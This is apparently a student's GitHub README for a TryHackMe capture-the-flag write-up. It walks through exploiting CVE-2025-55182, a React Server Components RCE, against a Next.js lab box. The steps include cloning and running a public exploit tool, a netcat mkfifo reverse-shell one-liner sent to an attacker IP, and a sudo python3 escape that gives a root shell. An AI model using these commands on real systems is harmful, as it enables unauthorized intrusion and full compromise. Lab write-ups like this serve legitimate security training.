# Romance and Co - CTF Penetration Testing

A comprehensive penetration testing report and walkthrough of the **Romance and Co.** CTF challenge on TryHackMe, demonstrating exploitation of CVE-2025-55182 (React Server Components RCE) and privilege escalation via misconfigured sudo permissions.

---

## 📋 Overview

**Target:** Next.js web application (Couples website)  
**IP Address:** 10.48.156.122:3000  
**Vulnerabilities Discovered:** 2 Critical/High  
**Outcome:** Complete system compromise (root access)  
**Time to Compromise:** ~150 minutes  

---

## 🎯 Vulnerabilities Identified

| CVE ID | Vulnerability | Severity | CVSS Score |
|--------|---------------|----------|-----------|
| CVE-2025-55182 | React Server Components RCE via Flight Protocol | CRITICAL | 9.8 |
| N/A | Privilege Escalation via Sudo Misconfiguration | HIGH | Chained |

---

## 📁 Repository Structure
```
romance-and-co/
├── README.md # This file - Quick reference
├── REPORT.md # Professional penetration testing report
├── walkthrough.md # Step-by-step exploitation guide
```

---

## 🔍 Quick Summary

### Attack Chain
1. **Reconnaissance** → Network scanning (nmap, gobuster, nuclei)
2. **Vulnerability Discovery** → CVE-2025-55182 identified
3. **Initial Access** → RCE via Flight protocol payload
4. **Persistence** → Reverse shell established (netcat)
5. **Privilege Escalation** → Python sudo abuse → Root shell
6. **Flag Retrieval** → User and root flags captured

### Key Findings
- ✅ Unauthenticated RCE possible without user interaction
- ✅ Privilege escalation achievable in single command
- ✅ Complete system compromise in ~150 minutes
- ✅ Attack automated via react2shell tool

---

## 🚀 Getting Started

### Prerequisites
- Kali Linux / Penetration Testing Distro
- Tools installed:
  - `nmap` - Network scanning
  - `gobuster` - Directory enumeration
  - `nuclei` - Vulnerability scanning
  - `netcat` - Reverse shell access
  - `python3` - Script execution

### Installation
```bash
# Clone this repository
git clone https://github.com/Bishal-Kumar-Baishya/Romance&co.git
cd Romance&co

# Clone the CVE-2025-55182 exploit tool
git clone https://github.com/sammwyy/r2sae
cd r2sae
```

### Usage
Read the documentation in order:

1. **[PENTEST_REPORT.md](./REPORT.md)** - Professional findings and analysis
2. **[WALKTHROUGH.md](./WALKTHROUGH.md)** - Step-by-step exploitation guide

---

## 📝 Exploitation Steps

### Step 1: Reconnaissance
```bash
sudo nmap -sC -sV 10.48.156.122
gobuster dir -u http://10.48.156.122:3000 -w /usr/share/wordlists/dirb/SecLists/Discovery/Web-Content/common.txt
nuclei -u http://10.48.156.122:3000
```

### Step 2: Initial RCE
```bash
python r2sae.py shell http://10.48.156.122:3000
# Execute: whoami, id, pwd
```

### Step 3: Reverse Shell
```bash
# Terminal 1: Listener
nc -lvnp 9001

# Terminal 2: Payload
python r2sae.py exec http://10.48.156.122:3000 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [ATTACKER-IP] 9001 >/tmp/f"
```

### Step 4: Privilege Escalation
```bash
sudo -l -l  # Enumerate sudo permissions
sudo python3 -c 'import os; os.system("/bin/sh")'  # Spawn root shell
```

### Step 5: Flag Retrieval
```bash
cat ~/user.txt   # User flag
cat /root/root.txt  # Root flag
```

---

## 🤝 Disclaimer

This penetration testing exercise was conducted as part of an authorized CTF challenge on TryHackMe. The techniques and tools described are for **educational and authorized testing purposes only**. Unauthorized access to computer systems is illegal.

---

## ✍️ Author

**Bishal Kumar Baishya**  
Cybersecurity Student | Penetration Testing Focus  
Portfolio: [GitHub Link](https://github.com/Bishal-Kumar-Baishya)<br>
LinkedIn: [LinkedIn Profile](https://www.linkedin.com/in/bishal-kumar-baishya-022b56412/)

---

## 📄 License

This project is for educational purposes. All documentation and findings are available for security professionals and students.

---

## 🔗 Quick Links

- 📖 [Full Penetration Testing Report](./PENTEST_REPORT.md)
- 🎯 [Step-by-Step Walkthrough](./WALKTHROUGH.md)
- 🐱 [GitHub Repository](https://github.com/Bishal-Kumar-Baishya/Romance&co)
- 💼 [Portfolio](https://github.com/Bishal-Kumar-Baishya)

---

**Last Updated:** September 23, 2026  
**Status:** Complete ✅